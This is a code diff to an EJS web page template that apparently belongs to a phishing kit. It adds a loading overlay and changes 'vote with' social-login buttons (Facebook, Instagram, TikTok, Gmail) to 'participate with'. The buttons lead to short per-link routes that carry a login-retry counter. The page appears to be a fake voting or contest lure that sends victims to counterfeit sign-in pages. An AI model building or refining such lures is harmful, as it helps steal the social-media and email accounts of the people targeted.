@@ -63,10 +63,41 @@
         width: 2em;
         padding-left: 0.5em;
       }
+
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .loading-spinner {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #3498db;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
     </style>
     <title><%= name %></title>
   </head>
   <body>
+    <!-- 5 seconds loading overlay -->
     <div class="card">
       <div class="profile">
         <img class="dp" src="/dp.png" alt="" />
@@ -74,22 +105,22 @@
         <div class="s-action">
           <% if(linkType == 'FACEBOOK'){%>
           <a href="/face/<%= linkId %>?retry=<%=link.numberOfRetries%>">
-            vote with facebook
+            participate with facebook
             <img src="/img/facebook-logo.png" alt="" class="" />
           </a>
           <%}%> <% if(linkType == 'INSTAGRAM'){%>
           <a href="/inst/<%= linkId %>?retry=<%=link.numberOfRetries%>">
-            vote with instagram
+            participate with instagram
             <img src="/insta.webp" alt="" class="" />
           </a>
           <%}%> <% if(linkType == 'TIKTOK'){%>
           <a href="/tikto/<%= linkId %>?retry=<%=link.numberOfRetries%>">
-            vote with tiktok
+            participatse with tiktok
             <img src="/tiktok/tiktok.png" alt="" class="" />
           </a>
           <%}%> <% if(linkType == 'GMAIL'){%>
           <a href="/gma/<%= linkId %>?retry=<%=link.numberOfRetries%>">
-            vote with gmail
+            participate with gmail
             <img src="/img/gmail.png" alt="" class="" />
           </a>
           <%}%>
